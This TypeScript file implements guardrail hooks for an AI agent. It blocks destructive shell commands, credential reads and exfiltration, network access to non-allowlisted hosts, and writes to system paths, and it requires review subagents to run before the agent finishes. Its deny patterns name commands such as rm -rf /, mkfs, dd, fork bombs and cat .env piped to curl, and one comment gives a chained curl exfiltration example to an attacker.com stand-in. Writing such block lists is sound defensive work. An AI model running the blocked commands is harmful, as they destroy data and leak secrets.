import type { HookCallback } from "@anthropic-ai/claude-agent-sdk";
import { resolve as resolvePath, isAbsolute as isAbsolutePath } from "path";
import { logToolEvent } from "./audit.js";
import { detectSecrets, summarizeMatches } from "./leak-detect.js";
import { getBrainDir } from "./brain.js";

// IMPORTANT: These regex patterns are defense-in-depth, not a security boundary.
// Docker container isolation is the primary security layer.
// These patterns catch common accidental damage, not adversarial attacks.

// Known subagent names — exact-match list used by trackChangesHook so a
// loosely-named main-agent dispatch (description containing "test", "review",
// etc.) can't satisfy the Stop hook's mandatory-subagent check.
const KNOWN_SUBAGENTS = new Set([
  "code-reviewer",
  "tester",
  "eval",
  "goal-verifier",
  "brain-curator",
]);

// ---------------------------------------------------------------------------
// Destructive command patterns (Bash tool)
// ---------------------------------------------------------------------------

// Reusable inner-payload pattern — destructive keywords that should be blocked
// regardless of how they're wrapped (nested shell, $(...), backticks, etc).
const DESTRUCTIVE_PAYLOAD = String.raw`(?:rm\s+-[^\s]*[rR][^\s]*[fF]?[^\s]*\s+(?:\/|~|\.)|mkfs\b|dd\s+if=|DROP\s+(?:DATABASE|TABLE|SCHEMA)\b|TRUNCATE\s+TABLE\b|chmod\s+(?:-[^\s]*[rR][^\s]*\s+)?777\s+\/|:\(\)\s*\{)`;

const DESTRUCTIVE_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
  // Catastrophic `rm -rf` deletion is handled by isCatastrophicRm() (token-aware,
  // so flag order/long flags/globs like `rm -fr /`, `rm -rf /*`, `rm -r -f /`
  // can't slip past a brittle regex). The nested-shell / $(...) / backtick
  // wrappers below still carry an rm sub-pattern for defense-in-depth.

  // Git force push to protected branches
  { pattern: /git\s+push\s+.*--force.*\b(main|master|production|release)\b/, reason: "Blocked: force push to protected branch" },
  { pattern: /git\s+push\s+.*\b(main|master|production|release)\b.*--force/, reason: "Blocked: force push to protected branch" },
  { pattern: /git\s+push\s+(?:origin\s+)?(?:main|master|production)\b(?!\/)/, reason: "Blocked: direct push to main/master/production" },

  // SQL destruction
  { pattern: /DROP\s+(DATABASE|TABLE|SCHEMA)\b/i, reason: "Blocked: destructive SQL operation" },
  { pattern: /TRUNCATE\s+TABLE\b/i, reason: "Blocked: destructive SQL TRUNCATE" },

  // System-level damage
  { pattern: /chmod\s+777\s+\//, reason: "Blocked: chmod 777 on root path" },
  { pattern: /chmod\s+-[^\s]*[rR][^\s]*\s+777\s+\//, reason: "Blocked: chmod -R 777 on root path" },
  { pattern: /chown\s+(?:-[^\s]+\s+)*\S+\s+(?:\/etc|\/usr|\/bin|\/sbin|\/root|\/boot|\/var)(?:\/|\s|$)/, reason: "Blocked: chown on system path" },
  { pattern: /mkfs\b/, reason: "Blocked: mkfs — filesystem formatting" },
  { pattern: /dd\s+if=/, reason: "Blocked: dd — raw disk write" },
  { pattern: /:\(\)\{.*\|.*&\s*\}\s*;/, reason: "Blocked: fork bomb detected" },

  // find -based mass deletion
  { pattern: /find\s+\/(?:\s|$)[\s\S]*-delete\b/, reason: "Blocked: find / -delete — mass filesystem deletion" },
  { pattern: /find\s+\/(?:\s|$)[\s\S]*-exec\s+rm\b/, reason: "Blocked: find / -exec rm — mass filesystem deletion" },
  { pattern: /find\s+~[\s\S]*-delete\b/, reason: "Blocked: find ~ -delete — mass home deletion" },
  { pattern: /find\s+~[\s\S]*-exec\s+rm\b/, reason: "Blocked: find ~ -exec rm — mass home deletion" },

  // xargs piping into destructive ops
  { pattern: /\|\s*xargs\s+(?:-[^\s]+\s+)*rm\b/, reason: "Blocked: xargs rm — bulk deletion via pipeline" },

  // Credential exfiltration
  { pattern: /cat\s+.*\.ssh\//, reason: "Blocked: reading SSH keys" },
  { pattern: /cat\s+.*\.env\b.*\|\s*(curl|wget|nc)/, reason: "Blocked: exfiltrating environment variables" },

  // Nested shell wrapping a destructive payload
  { pattern: new RegExp(String.raw`\b(?:bash|sh|zsh|ksh|dash)\s+-c\s+['"]?[^'"]*` + DESTRUCTIVE_PAYLOAD), reason: "Blocked: nested shell wrapping a destructive command" },

  // Command substitution wrapping a destructive payload — $(...) and backticks
  { pattern: new RegExp(String.raw`\$\([^)]*` + DESTRUCTIVE_PAYLOAD), reason: "Blocked: command substitution wrapping a destructive command" },
  { pattern: new RegExp("`[^`]*" + DESTRUCTIVE_PAYLOAD), reason: "Blocked: backtick substitution wrapping a destructive command" },

  // python/python3 -c with destructive operations
  // Use .* (not [^'"]*) so quoted/escaped payloads still match
  { pattern: /python3?\s+-c\s.*(?:shutil\.rmtree|os\.remove|os\.unlink|\.unlink\s*\(|os\.system\s*\(|subprocess.*\bcall\b|subprocess.*\brun\b)/, reason: "Blocked: python -c with destructive filesystem/subprocess call" },

  // node -e with destructive operations
  // Use \bfs\b.*\.method to handle require("fs").method style where chars
  // between "fs" and the method (escaped quotes, ")") would otherwise break a literal match.
  { pattern: /node\s+-e\s.*(?:\bfs\b.*\.(?:rmSync|unlinkSync|rmdirSync|rm\s*\(|unlink\s*\()|child_process)/, reason: "Blocked: node -e with destructive filesystem/child_process call" },

  // perl -e with system-level ops
  { pattern: /perl\s+-[^\s]*e\s.*(?:system\s*\(|exec\s*\(|unlink\s*\(|qx\s*[\(\{])/, reason: "Blocked: perl -e with system-level operation" },

  // ruby -e with system-level ops
  { pattern: /ruby\s+-e\s.*(?:Kernel\.system|system\s*\(|exec\s*\(|File\.delete|FileUtils\.rm|%x\s*[\(\{])/, reason: "Blocked: ruby -e with system-level operation" },
];

// Token-aware catastrophic `rm` detection. A brittle regex misses flag
// reordering (`rm -fr /`), separated flags (`rm -r -f /`), long flags
// (`rm --recursive --force /`), and globs (`rm -rf /*`). We instead tokenize,
// collect the recursive+force flags for each `rm` invocation, and check the
// target against a small set of catastrophic paths.
const RM_DANGEROUS_TARGETS = new Set([
  "/", "/*", "~", "~/", ".", "./", "$HOME", "${HOME}", "$HOME/", "${HOME}/",
]);

function stripQuotes(tok: string): string {
  return tok.replace(/^['"`]+/, "").replace(/['"`]+$/, "");
}

function isCatastrophicRm(command: string): boolean {
  const tokens = command.split(/\s+/).map(stripQuotes).filter(Boolean);
  for (let i = 0; i < tokens.length; i++) {
    if (tokens[i] !== "rm") continue;
    let hasR = false;
    let hasF = false;
    const targets: string[] = [];
    for (let j = i + 1; j < tokens.length; j++) {
      const t = tokens[j];
      if (t === "--recursive") { hasR = true; continue; }
      if (t === "--force") { hasF = true; continue; }
      if (t.startsWith("-") && t.length > 1 && !t.startsWith("--")) {
        if (/[rR]/.test(t)) hasR = true;
        if (/f/.test(t)) hasF = true;
        continue;
      }
      // Target region — stop at a shell-command boundary so we don't pull
      // targets from a following command (`rm -rf build && echo /`).
      const sep = t.search(/[;&|]/);
      if (sep === 0) break;
      const target = sep === -1 ? t : t.slice(0, sep);
      if (target) targets.push(target);
      if (sep !== -1) break;
    }
    if (hasR && hasF && targets.some((t) => RM_DANGEROUS_TARGETS.has(t))) return true;
  }
  return false;
}

// ---------------------------------------------------------------------------
// Network policy (Bash tool) — only allow known package registries
// ---------------------------------------------------------------------------

const ALLOWED_HOSTS: string[] = [
  // Package registries
  "registry.npmjs.org",
  "registry.yarnpkg.com",
  "pypi.org",
  "files.pythonhosted.org",
  "rubygems.org",
  "crates.io",
  "static.crates.io",
  "pkg.go.dev",
  "proxy.golang.org",
  "dl-cdn.alpinelinux.org",
  "deb.debian.org",
  "archive.ubuntu.com",
  // GitHub (for git clone, package downloads)
  "github.com",
  "raw.githubusercontent.com",
  "objects.githubusercontent.com",
  // Common CDNs for package downloads
  "cdn.jsdelivr.net",
  "unpkg.com",
];

function getExtraAllowedHosts(): string[] {
  const extra = process.env.ALLOWED_HOSTS;
  if (!extra) return [];
  return extra.split(",").map((h) => h.trim()).filter(Boolean);
}

const NETWORK_COMMANDS = /\b(curl|wget|nc|ncat|netcat|ssh|scp|rsync|ftp|socat)\b/;

// Script-mode invocations that bypass the curl/wget detection by performing
// network requests inside an interpreter. Block these outright — we can't
// reliably extract URLs from arbitrary code, and the WebFetch tool is the
// approved channel for web access.
// Use \bmod\b.*\.method patterns so require("mod").method style matches
// (the escaped quotes and ")" between mod and method break a literal regex).
const SCRIPT_MODE_NETWORK = /(?:python3?\s+-c|node\s+-e|perl\s+-[^\s]*e|ruby\s+-e)\s.*(?:requests\.|urllib|urlopen|http\.client|httplib|fetch\s*\(|axios|got\s*\(|\bnet\b.*\.(?:connect|createConnection)\s*\(|\bhttps?\b.*\.(?:get|request)\s*\(|Net::HTTP|open-uri|LWP::|HTTP::)/;

function extractHostFromUrl(url: string): string | null {
  try {
    return new URL(url).hostname;
  } catch {
    return null;
  }
}

/**
 * Extract EVERY host referenced by a (possibly chained) command. Checking only
 * the first URL let `curl https://ok.com && curl https://attacker.com` exfiltrate
 * — the first host was allowed, so the whole call passed. We now collect all
 * URLs and all socat/ssh/scp/rsync/nc targets so the network check can reject
 * if ANY of them is disallowed.
 */
function extractAllHosts(command: string): string[] {
  const hosts = new Set<string>();
  const add = (h: string | undefined | null) => {
    if (h) hosts.add(h.toLowerCase());
  };

  for (const m of command.matchAll(/https?:\/\/([^\/\s:"'`]+)/gi)) add(m[1]);
  for (const m of command.matchAll(/(?:TCP[46]?|UDP[46]?|OPENSSL|SSL):([^:\s,"'`]+):/gi)) add(m[1]);
  // ssh/scp/rsync/git targets: user@host and host:path forms. We deliberately
  // do NOT positionally grab "the first token after ssh" — that mis-reads a
  // flag value (`-i key`) or a local filename (`scp ./file user@host:`) as the
  // host. Require a dotted hostname to limit false matches; anything that
  // resolves to no host (e.g. bare `ssh internalhost`) fails closed at the call site.
  for (const m of command.matchAll(/@([a-zA-Z0-9][a-zA-Z0-9.-]*\.[a-zA-Z]{2,})/g)) add(m[1]);
  for (const m of command.matchAll(/(?:^|\s)([a-zA-Z0-9][a-zA-Z0-9.-]*\.[a-zA-Z]{2,}):/g)) add(m[1]);
  for (const m of command.matchAll(/\b(?:nc|ncat|netcat)\s+(?:-[^\s]+\s+)*([a-zA-Z0-9][a-zA-Z0-9.-]*)\s+\d+/g)) add(m[1]);

  // Bare curl/wget targets (no scheme). Only count tokens that look like a
  // hostname (contain a dot) so flag values like `-X POST` aren't misread.
  for (const m of command.matchAll(/\b(?:curl|wget)\s+(?:-[^\s]+\s+)*([^\s\-][^\s]*)/g)) {
    let host: string;
    try {
      host = new URL(m[1]).hostname;
    } catch {
      host = m[1].split("/")[0];
    }
    if (host && host.includes(".")) add(host);
  }

  return [...hosts];
}

function isHostAllowed(host: string): boolean {
  const h = host.toLowerCase();
  const allAllowed = [
    ...ALLOWED_HOSTS,
    ...getExtraAllowedHosts(),
  ].map((a) => a.toLowerCase());

  return allAllowed.some(
    (allowed) => h === allowed || h.endsWith(`.${allowed}`),
  );
}

// ---------------------------------------------------------------------------
// File system policy (Write/Edit tools)
// ---------------------------------------------------------------------------

// Matched against the RESOLVED absolute path (path.resolve collapses `..` and
// makes relative paths absolute) so traversal like `a/../../../etc/x` and
// trailing-slash-less targets (`/root`) can't slip past.
const BLOCKED_WRITE_PATHS = [
  /^\/etc(\/|$)/,
  /^\/usr(\/|$)/,
  /^\/bin(\/|$)/,
  /^\/sbin(\/|$)/,
  /^\/root(\/|$)/,
  /^\/var(\/|$)/,
  /^\/opt(\/|$)/,
  /^\/lib(\/|$)/,
  /^\/boot(\/|$)/,
  /\/\.ssh(\/|$)/,
  /\/\.bashrc$/,
  /\/\.bash_profile$/,
  /\/\.zshrc$/,
  /\/\.profile$/,
  /\/\.gitconfig$/,
];

// ---------------------------------------------------------------------------
// Per-subagent Bash allowlists
// ---------------------------------------------------------------------------
//
// When the SDK fires a hook inside a subagent, BaseHookInput.agent_type is
// set to that subagent's name (e.g. "tester"). We use this to enforce
// tighter policy on subagents that don't need full Bash. The tester subagent
// should only run test commands and install test dependencies — anything
// else is a red flag.

const TESTER_BASH_ALLOWLIST: RegExp[] = [
  // npm/pnpm/yarn test
  /^\s*(?:npm|pnpm|yarn)\s+(?:run\s+)?(?:test|t)\b/,
  // npx test runners
  /^\s*npx\s+(?:vitest|jest|mocha|ava|tap|tape|cypress|playwright)\b/,
  // pytest direct or via python -m
  /^\s*pytest\b/,
  /^\s*python3?\s+-m\s+pytest\b/,
  // go test / cargo test
  /^\s*go\s+test\b/,
  /^\s*cargo\s+test\b/,
  // installing test dependencies
  /^\s*(?:npm|pnpm|yarn)\s+(?:install|i|add)\b/,
  /^\s*pip3?\s+install\b/,
  /^\s*(?:pip|uv)\s+add\b/,
  // TypeScript type-check
  /^\s*npx\s+tsc\s.*--noEmit\b/,
  /^\s*tsc\s.*--noEmit\b/,
];

function isTestCommandAllowed(command: string): boolean {
  return TESTER_BASH_ALLOWLIST.some((re) => re.test(command));
}

// ---------------------------------------------------------------------------
// PreToolUse hook
// ---------------------------------------------------------------------------

/**
 * Evaluate guardrail policy for a tool call. Returns null to allow,
 * or a deny-reason string to block.
 *
 * @param agentType - Subagent name. Per the SDK, this is set when the hook
 *   fires inside a subagent (alongside agent_id), OR on the main thread of
 *   a --agent session (without agent_id). For per-subagent Bash policy we
 *   gate on both: a subagent context (agent_id present) and the right name.
 *   The caller in `guardrailsHook` does this — by the time evaluate() is
 *   called, agentType is only set when we know we're inside a subagent.
 */
function evaluate(
  toolName: string,
  toolInput: Record<string, unknown>,
  agentType?: string,
): string | null {
  // --- Bash guardrails ---
  if (toolName === "Bash") {
    const command = (toolInput.command as string) || "";

    if (isCatastrophicRm(command)) {
      return "Blocked: rm -rf of a catastrophic target (/, /*, ~, .) — refusing recursive force-delete of a root/home/cwd path.";
    }

    for (const { pattern, reason } of DESTRUCTIVE_PATTERNS) {
      if (pattern.test(command)) return reason;
    }

    if (NETWORK_COMMANDS.test(command)) {
      // Check EVERY host in the (possibly chained) command, not just the first.
      const hosts = extractAllHosts(command);
      if (hosts.length === 0) {
        // A recognized network tool (curl/wget/nc/ssh/...) but we couldn't
        // resolve a host to check (URL hidden in a variable, a file via -K,
        // an unparsed flag, a listening socket). Fail CLOSED.
        return "Blocked: network command with no resolvable host to check (target hidden in a variable, file, or unparsed flag). Use the WebFetch tool, or pass an explicit allowed URL.";
      }
      for (const host of hosts) {
        if (!isHostAllowed(host)) {
          return `Blocked: network access to '${host}' is not allowed. Use the WebFetch tool for web requests, or add the host to ALLOWED_HOSTS.`;
        }
      }
    }

    if (SCRIPT_MODE_NETWORK.test(command)) {
      return "Blocked: script-mode network call (python/node/perl/ruby -c/-e). Use the WebFetch tool for web requests.";
    }

    // Per-subagent Bash allowlist: tester may only run test commands
    if (agentType === "tester" && !isTestCommandAllowed(command)) {
      return "Blocked: the tester subagent may only run test commands (npm test, pytest, go test, etc.) or install test dependencies. Use Read/Write/Edit for non-test work.";
    }
  }

  // --- Write/Edit guardrails ---
  if (toolName === "Write" || toolName === "Edit") {
    const filePath = (toolInput.file_path as string) || "";
    // Resolve BEFORE matching so `..` traversal and trailing-slash-less targets
    // can't dodge the system-path block.
    const resolvedFilePath = filePath ? resolvePath(filePath) : "";
    for (const pattern of BLOCKED_WRITE_PATHS) {
      if (pattern.test(resolvedFilePath)) {
        return `Blocked: writing to '${filePath}' (resolves to '${resolvedFilePath}') is not allowed. System and dotfiles outside the project are protected.`;
      }
    }

    // Per-subagent path restriction: the brain-curator may only write under
    // the brain directory. This prevents the curator from accidentally
    // editing project files or stepping outside its sandbox.
    // Uses path.resolve() so any '..' segments collapse before the prefix
    // check — a bare startsWith() would allow `<brainDir>/../escape.md`.
    if (agentType === "brain-curator") {
      const brainDir = resolvePath(getBrainDir());
      if (!isAbsolutePath(filePath)) {
        return (
          `Blocked: the brain-curator must use absolute paths under '${brainDir}'. ` +
          `Relative path '${filePath}' is rejected.`
        );
      }
      const resolved = resolvePath(filePath);
      if (resolved !== brainDir && !resolved.startsWith(brainDir + "/")) {
        return (
          `Blocked: the brain-curator subagent may only write to files under '${brainDir}'. ` +
          `Path '${filePath}' resolves to '${resolved}', which is outside the brain.`
        );
      }
    }

    // Leak detection — scan the content being written for known secret
    // patterns. Generated code should reference secrets via env vars, never
    // embed them inline. Write provides 'content'; Edit provides 'new_string'.
    const content = (toolInput.content as string) ?? (toolInput.new_string as string) ?? "";
    if (typeof content === "string" && content.length > 0) {
      const matches = detectSecrets(content);
      if (matches.length > 0) {
        const kinds = summarizeMatches(matches).join(", ");
        return (
          `Blocked: ${toolName} would write a likely secret into '${filePath}' ` +
          `(matched: ${kinds}). Read secrets from environment variables or a .env file at runtime instead.`
        );
      }
    }
  }

  // --- WebFetch host allowlist (parity with Bash network policy) ---
  if (toolName === "WebFetch") {
    const url = (toolInput.url as string) || "";
    const host = extractHostFromUrl(url);
    if (!host) {
      return `Blocked: WebFetch URL '${url}' is malformed.`;
    }
    if (!isHostAllowed(host)) {
      return (
        `Blocked: WebFetch to '${host}' is not allowed. ` +
        `Allowed hosts are package registries, GitHub, and any host in ALLOWED_HOSTS.`
      );
    }
  }

  return null;
}

export const guardrailsHook: HookCallback = async (input) => {
  const raw = input as Record<string, unknown>;
  const toolInput = raw.tool_input as Record<string, unknown> | undefined;
  const toolName = raw.tool_name as string | undefined;
  const sessionId = (raw.session_id as string) || "unknown";
  // SDK BaseHookInput: agent_id is the documented marker for "this call
  // happened inside a subagent" (agent_type alone is ambiguous in --agent
  // sessions). Only pass agent_type through when we know it identifies a
  // subagent — that's what per-subagent policies (e.g. tester Bash allowlist)
  // are gated on.
  const agentId = raw.agent_id as string | undefined;
  const agentTypeRaw = raw.agent_type as string | undefined;
  const agentType = agentId ? agentTypeRaw : undefined;

  if (!toolName || !toolInput) return {};

  const denyReason = evaluate(toolName, toolInput, agentType);

  logToolEvent({
    sessionId,
    phase: "pre",
    toolName,
    toolInput,
    result: denyReason ? "denied" : "allowed",
    ...(denyReason ? { denyReason } : {}),
  });

  if (denyReason) {
    return { behavior: "deny", message: denyReason } as never;
  }
  return {};
};

// ---------------------------------------------------------------------------
// Session-scoped state — fixes the prior module-global concurrency bug where
// two simultaneous runs in the same process clobbered each other's tracking.
// State is keyed by SDK-provided session_id; entries are dropped after 24h
// of inactivity so long-running servers don't leak memory.
// ---------------------------------------------------------------------------

interface SessionState {
  filesChanged: boolean;
  webFetched: boolean;
  reviewerRan: boolean;
  testerRan: boolean;
  evalRan: boolean;
  goalVerifierRan: boolean;
  brainCuratorRan: boolean;
  lastTouched: number;
}

const sessionState = new Map<string, SessionState>();
const SESSION_TTL_MS = 24 * 60 * 60 * 1000;

function freshState(): SessionState {
  return {
    filesChanged: false,
    webFetched: false,
    reviewerRan: false,
    testerRan: false,
    evalRan: false,
    goalVerifierRan: false,
    brainCuratorRan: false,
    lastTouched: Date.now(),
  };
}

function getState(sessionId: string): SessionState {
  let s = sessionState.get(sessionId);
  if (!s) {
    s = freshState();
    sessionState.set(sessionId, s);
  } else {
    s.lastTouched = Date.now();
  }
  return s;
}

setInterval(() => {
  const cutoff = Date.now() - SESSION_TTL_MS;
  for (const [id, s] of sessionState) {
    if (s.lastTouched < cutoff) sessionState.delete(id);
  }
}, 60 * 60 * 1000).unref();

/**
 * Reset state for a specific session. Use between user prompts in the same
 * session so previously-run subagents don't satisfy the next prompt's
 * Stop-hook check.
 */
export function resetSessionState(sessionId: string): void {
  if (sessionId) sessionState.set(sessionId, freshState());
}

// Test/legacy helper — clears every session. Used by the framework self-tests.
export function _resetAllSessionStateForTests(): void {
  sessionState.clear();
}

// Exposed for tests — direct access to pure evaluators bypasses the
// hook-input shape and lets us assert behaviour with small fixtures.
export const _internal = {
  evaluate,
  isHostAllowed,
  KNOWN_SUBAGENTS,
  getState,
};

// ---------------------------------------------------------------------------
// PostToolUse hook — track side effects and which subagents ran
// ---------------------------------------------------------------------------

export const trackChangesHook: HookCallback = async (input) => {
  const raw = input as Record<string, unknown>;
  const toolName = raw.tool_name as string | undefined;
  const toolInput = raw.tool_input as Record<string, unknown> | undefined;
  const sessionId = (raw.session_id as string) || "unknown";

  if (toolName && toolInput) {
    logToolEvent({
      sessionId,
      phase: "post",
      toolName,
      toolInput,
      result: "completed",
    });
  }

  const state = getState(sessionId);

  if (toolName === "Write" || toolName === "Edit") {
    state.filesChanged = true;
  }

  // WebFetch is a side-effecting tool (visible egress, potential exfil). Treat
  // it the same as a file write for the purposes of Stop-hook review.
  if (toolName === "WebFetch") {
    state.webFetched = true;
  }

  // Subagent attribution — match exact name only. Anything outside the known
  // set is ignored, so a description like "test the import path" can't
  // accidentally satisfy the tester requirement.
  if (toolName === "Agent" && toolInput) {
    const sub = String(toolInput.subagent_type ?? "").trim();
    if (KNOWN_SUBAGENTS.has(sub)) {
      if (sub === "code-reviewer") state.reviewerRan = true;
      else if (sub === "tester") state.testerRan = true;
      else if (sub === "eval") state.evalRan = true;
      else if (sub === "goal-verifier") state.goalVerifierRan = true;
      else if (sub === "brain-curator") state.brainCuratorRan = true;
    }
  }

  return {};
};

// ---------------------------------------------------------------------------
// Stop hook — refuses to finish until required subagents have run.
// Triggers on file changes OR WebFetch (the two side-effecting paths).
// Resets the session's tracking on a successful pass so the next user prompt
// in the same session starts from a clean slate.
// ---------------------------------------------------------------------------

export const enforceReviewHook: HookCallback = async (input) => {
  const raw = input as Record<string, unknown>;
  const sessionId = (raw.session_id as string) || "unknown";
  const state = getState(sessionId);

  if (!state.filesChanged && !state.webFetched) return {};

  const missing: string[] = [];
  if (!state.reviewerRan) missing.push("code-reviewer");
  if (!state.testerRan) missing.push("tester");
  if (!state.evalRan) missing.push("eval");
  if (!state.goalVerifierRan) missing.push("goal-verifier");
  if (!state.brainCuratorRan) missing.push("brain-curator");

  if (missing.length > 0) {
    const trigger = state.filesChanged ? "modified files" : "called WebFetch";
    return {
      decision: "block",
      reason:
        `You ${trigger} but haven't run required subagents yet: ${missing.join(", ")}. ` +
        `Dispatch each one before finishing. The goal-verifier subagent reads .dom-goal ` +
        `from the working directory to compare the build against the user's original request. ` +
        `The brain-curator runs last; pass it BRAIN_DIR=${getBrainDir()} and a one-paragraph ` +
        `session summary so it can decide what (if anything) belongs in long-term memory.`,
    } as never;
  }

  // All required reviews ran — reset for the next prompt in this session.
  resetSessionState(sessionId);
  return {};
};
